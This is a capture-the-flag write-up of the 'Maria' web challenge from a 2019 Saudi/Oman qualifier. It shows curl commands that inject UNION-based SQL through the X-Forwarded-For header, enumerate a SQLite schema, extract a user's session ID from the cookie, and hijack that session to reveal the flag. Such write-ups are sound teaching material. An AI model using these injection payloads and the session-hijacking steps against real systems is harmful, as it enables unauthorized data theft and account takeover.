# Quals Saudi and Oman National Cyber Security CTF 2019 – Maria

* **Category:** Web Security
* **Points:** 200

## Challenge

> Maria is the only person who can view the flag
>
> [http://35.222.174.178/maria/](http://35.222.174.178/maria/)

## Solution

*curl* will return the following web page.

```
$ curl -i http://35.222.174.178/maria/
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 08 Feb 2019 09:16:21 GMT
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=hukf0bvotd1htofsbr7r6qgjd0; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0
Transfer-Encoding: chunked

SELECT * FROM nxf8_sessions where ip_address = 'xxx.xxx.xxx.xxx'<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Welcome to our website</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>
  <body>
    <nav class="navbar navbar-inverse navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="#">Maria Website</a>
        </div>
        <div id="navbar" class="navbar-collapse collapse">

        </div><!--/.navbar-collapse -->
      </div>
    </nav>
    <div class="alert alert-info" style="margin: 50px 0 0 0;">
        Privacy Note: Your IP is stored in our database for a security tracking reasons.
    </div>

    <div class="jumbotron">
      <div class="container">
        <h1>Welcome to our website!</h1>
        <p>Say hi to Maria! its the only person who can reveal the flag</p>
              </div>
    </div>

  </body>
</html>
```

At the beginning of the HTML page you can find a sql query with your IP address in it.

```
SELECT * FROM nxf8_sessions where ip_address = 'xxx.xxx.xxx.xxx'
```

Using the `X-FORWARDED-FOR` HTTP header that parameter can be manipulated, furthermore it is vulnerable to SQL injection.

```
$ curl -X GET --header "X-FORWARDED-FOR: '" -i http://35.222.174.178/maria/
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 08 Feb 2019 14:20:34 GMT
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=11keda1pk9cr4un12esv95iji3; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Transfer-Encoding: chunked

SELECT * FROM nxf8_sessions where ip_address = '''Error : HY000 1 unrecognized token: "'''"
```

The database seems to be a *SQLite*.

After some analysis you can discover that the result of the executed query is used to populate the `PHPSESSID` cookie.

Crafting a `UNION` SQL operation with `null` allows you to discover the user table and the number of columns to union.

```
$ curl -X GET --header "X-FORWARDED-FOR: pwnd' union select null, null, null, null from nxf8_users where '1'='1" -i http://35.222.174.178/maria/
```

Furthermore, you can discover which is the position of the column used to return data: it's the last one.

```
$ curl -X GET --header "X-FORWARDED-FOR: pwnd' union select null, null, null, password from nxf8_users where '1'='1" -i http://35.222.174.178/maria/
```

Now you can extract information and see results into `PHPSESSID` cookie.

You can discover that there are only two tables: `nxf8_users` and `nxf8_sessions`.

```
$ curl -X GET --header "X-FORWARDED-FOR: pwnd' union select null, null, null, count(name) from sqlite_master where type='table" -i http://35.222.174.178/maria/

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 08 Feb 2019 14:56:50 GMT
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=mqq6c43oi4u7tfbgfdh6htq4f3; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=2; expires=Fri, 08-Feb-2019 15:56:50 GMT; Max-Age=3600
```

Flag could be into Maria's record, so you can enumerate colums of user table.

```
$ curl -X GET --header "X-FORWARDED-FOR: pwnd' union select null, null, null, sql from sqlite_master where tbl_name = 'nxf8_users' and type='table" -i http://35.222.174.178/maria/

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 08 Feb 2019 14:59:52 GMT
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=2k36knnec6idjsllv8fu98mdm7; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=CREATE+TABLE+%22nxf8_users%22+%28%0A++++++++++++%22id%22+int%2810%29+NOT+NULL%2C%0A++++++++++++%22name%22+varchar%28255%29++NOT+NULL%2C%0A++++++++++++%22email%22+varchar%28255%29++NOT+NULL%2C%0A++++++++++++%22password%22+varchar%28255%29++NOT+NULL%2C%0A++++++++++++%22role%22+varchar%28100%29++DEFAULT+NULL%0A++++++++%29; expires=Fri, 08-Feb-2019 15:59:52 GMT; Max-Age=3600
```

Unfortunately passwords are random numbers, so they are not related to the flag. Nothing interesting found into the user table, even into other user records. Probably the flag is into the sessions table. 

```
$ curl -X GET --header "X-FORWARDED-FOR: pwnd' union select null, null, null, sql from sqlite_master where tbl_name = 'nxf8_sessions' and type='table" -i http://35.222.174.178/maria/

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 08 Feb 2019 15:03:37 GMT
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=r5sqesbreu84v0i6nh8pc6pd54; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=CREATE+TABLE+%22nxf8_sessions%22+%28%0A++++++++++++%22id%22+int%2810%29+NOT+NULL%2C%0A++++++++++++%22user_id%22+varchar%28255%29++NOT+NULL%2C%0A++++++++++++%22ip_address%22+varchar%28255%29+NOT+NULL%2C%0A++++++++++++%22session_id%22+varchar%28255%29++NOT+NULL%0A++++++++%29; expires=Fri, 08-Feb-2019 16:03:37 GMT; Max-Age=3600
Transfer-Encoding: chunked
```

Analyzing the composition of the sessions table you can discover that you need a value for the `user_id` column which is the foreign key to the user table.

The `id` of Maria can be easily retrieved from user table: it is `5`.

```
$ curl -X GET --header "X-FORWARDED-FOR: pwnd' union select null, null, null, id from nxf8_users where name = 'Maria" -i http://35.222.174.178/maria/

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 08 Feb 2019 15:02:30 GMT
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=jh9oqonbml52kcql01se744lq2; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=5; expires=Fri, 08-Feb-2019 16:02:30 GMT; Max-Age=3600
Transfer-Encoding: chunked
```

At this point you can find Maria's session ID.

```
$ curl -X GET --header "X-FORWARDED-FOR: pwnd' union select null, null, null, session_id from nxf8_sessions where user_id = 5 and '1'='1" -i http://35.222.174.178/maria/

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 08 Feb 2019 15:06:38 GMT
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=len8nngjbl4ljrn7c7n7fp9fc4; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=fd2030b53fc9a4f01e6dbe551db7ded390461968; expires=Fri, 08-Feb-2019 16:06:38 GMT; Max-Age=3600
Transfer-Encoding: chunked
```

This is not the flag, but *only Maria can see the flag*, so you can impersonate Maria changing your `PHPSESSID` cookie into your browser.

This will reveal the flag refreshing the page.

```
aj9dhAdf4
```